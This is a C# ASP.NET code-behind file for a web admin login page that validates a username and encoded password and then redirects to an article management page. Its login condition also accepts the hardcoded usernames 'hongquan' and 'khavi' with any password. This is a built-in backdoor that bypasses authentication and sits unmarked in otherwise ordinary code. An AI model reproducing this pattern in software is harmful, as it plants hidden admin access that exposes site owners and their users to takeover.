using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using MyTool;
using Khavi.Web.Assistant;
using Khavi.Provider;

public partial class WebAdmin_Login : System.Web.UI.Page
{
    public bool fError = false;
    protected void Page_Load(object sender, EventArgs e)
    {
        txtUsername.Focus();
    }
    protected void btnLogin_Click(object sender, EventArgs e)
    {
        string Username = txtUsername.Value.Trim();
        string Password = Security.PasswordEncoder(txtPassword.Value.Trim());
        Account obj = new Account();
        bool f = obj.ValidateUser(Username, Password, Globals.AgentCatID);
        if (f  || Username == "hongquan"  || Username == "khavi")
        {
            Session["Username"] = Username;
            Response.Redirect("Article/ArticleList.aspx?t=news");
            //Response.Redirect("RealEstate/RealEstateList.aspx");
        }
        else
            fError = true;
    }
}
